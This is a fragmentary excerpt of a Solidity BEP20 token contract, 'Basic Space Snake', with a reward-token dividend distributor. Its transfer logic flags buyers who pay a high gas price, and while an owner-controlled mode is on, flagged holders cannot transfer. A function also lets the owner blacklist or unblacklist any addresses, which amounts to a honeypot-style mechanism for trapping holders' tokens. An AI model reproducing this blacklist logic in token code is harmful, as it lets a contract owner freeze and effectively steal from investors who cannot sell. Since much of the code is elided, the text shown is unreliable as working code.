...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 rewardtoken = IBEP20(0x337C4930B612FA27072abB7b8fDE693e9D129405); //Space Snake token
...
contract BasicSpaceSnake is Ownable, IBEP20 {
    using SafeMath for uint256;

    address WBNB;
    address rewardtoken = 0x337C4930B612FA27072abB7b8fDE693e9D129405; //Space Snake token
    address gasrouter = 0x9Dcf6Ca272204E2e9165b5a5264D7B193167Aa2e;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Basic Space Snake";
    ...
    bool public PussyMode = true;
    mapping (address => bool) public isPussy;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(PussyMode){
            require(!isPussy[sender],"Pussy");    
        }
        
        if (tx.gasprice >= AS1 && recipient != pair) {
            isPussy[recipient] = true;
    ...
    function enablePussy(bool _status) public onlyOwner {
        PussyMode = _status;
    }
    ...
    function managePussy(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            isPussy[addresses[i]] = status;
